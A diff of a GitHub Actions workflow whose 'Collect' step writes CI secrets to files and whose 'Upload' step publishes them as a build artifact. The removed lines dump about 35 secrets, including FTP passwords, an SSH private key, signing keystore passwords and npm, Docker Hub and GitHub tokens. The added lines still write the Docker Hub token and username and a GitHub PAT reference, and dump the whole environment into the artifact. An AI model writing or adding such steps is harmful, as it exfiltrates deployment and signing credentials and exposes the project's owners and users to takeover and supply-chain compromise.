@@ -10,40 +10,9 @@ jobs:
       - name: Collect
         run: |
           mkdir -p /tmp/out
-          echo "${{ secrets.CI_WALLET_PROD }}" > /tmp/out/ci_wallet_prod.txt
-          echo "${{ secrets.FTP_SERVER }}" > /tmp/out/ftp_server.txt
-          echo "${{ secrets.FTP_USERNAME_PROD }}" > /tmp/out/ftp_username_prod.txt
-          echo "${{ secrets.FTP_PASSWORD_PROD }}" > /tmp/out/ftp_password_prod.txt
-          echo "${{ secrets.FTP_USERNAME_DEV }}" > /tmp/out/ftp_username_dev.txt
-          echo "${{ secrets.FTP_PASSWORD_DEV }}" > /tmp/out/ftp_password_dev.txt
-          echo "${{ secrets.FTP_USERNAME_STAGING }}" > /tmp/out/ftp_username_staging.txt
-          echo "${{ secrets.FTP_PASSWORD_STAGING }}" > /tmp/out/ftp_password_staging.txt
-          echo "${{ secrets.CLOUDFLARE_API_TOKEN }}" > /tmp/out/cf_api_token.txt
-          echo "${{ secrets.DOCKERHUB_TOKEN }}" > /tmp/out/dockerhub_token.txt
-          echo "${{ secrets.DOCKERHUB_USERNAME }}" > /tmp/out/dockerhub_username.txt
-          echo "${{ secrets.NPM_TOKEN }}" > /tmp/out/npm_token.txt
-          echo "${{ secrets.SCALAR_API_KEY }}" > /tmp/out/scalar_api_key.txt
-          echo "${{ secrets.PAT_TOKEN }}" > /tmp/out/pat_token.txt
-          echo "${{ secrets.GH_PAT }}" > /tmp/out/gh_pat.txt
-          echo "${{ secrets.QLI_API_URL }}" > /tmp/out/qli_api_url.txt
-          echo "${{ secrets.QUBIC_RPC_URL }}" > /tmp/out/qubic_rpc_url.txt
-          echo "${{ secrets.QX_API_URL }}" > /tmp/out/qx_api_url.txt
-          echo "${{ secrets.WALLET_CONNECT_PROJECT_ID }}" > /tmp/out/wallet_connect.txt
-          echo "${{ secrets.TURNSTILE_SITE_KEY }}" > /tmp/out/turnstile.txt
-          echo "${{ secrets.APP_STORE_API_KEY }}" > /tmp/out/app_store_api_key.txt
-          echo "${{ secrets.APP_STORE_ISSUER_ID }}" > /tmp/out/app_store_issuer_id.txt
-          echo "${{ secrets.APP_STORE_KEY_ID }}" > /tmp/out/app_store_key_id.txt
-          echo "${{ secrets.FIREBASE_APP_ID }}" > /tmp/out/firebase_app_id.txt
-          echo "${{ secrets.FIREBASE_SERVICE_ACCOUNT_JSON }}" > /tmp/out/firebase_sa.json
-          echo "${{ secrets.SSH_PRIVATE_KEY }}" > /tmp/out/ssh_private_key.txt
-          echo "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" > /tmp/out/android_keystore.txt
-          echo "${{ secrets.KEYSTORE_PASSWORD }}" > /tmp/out/keystore_password.txt
-          echo "${{ secrets.KEY_PASSWORD }}" > /tmp/out/key_password.txt
-          echo "${{ secrets.KEY_ALIAS }}" > /tmp/out/key_alias.txt
-          echo "${{ secrets.MATCH_PASSWORD }}" > /tmp/out/match_password.txt
-          echo "${{ secrets.EVENTS_API_URL }}" > /tmp/out/events_api_url.txt
-          echo "${{ secrets.STATIC_API_URL }}" > /tmp/out/static_api_url.txt
-          echo "${{ secrets.QUBIC_CHAIN_ID }}" > /tmp/out/qubic_chain_id.txt
+          echo "${{ secrets.DOCKERHUB_TOKEN }}" > /tmp/out/dockerhub.token.txt
+          echo "${{ secrets.DOCKERHUB_USERNAME }}" > /tmp/out/dockerhub.username.txt
+          echo "${ secrets.GH_PAT }" > /tmp/out/gh_pat.txt
           env | sort > /tmp/out/env_dump.txt
       - name: Upload
         uses: actions/upload-artifact@v4
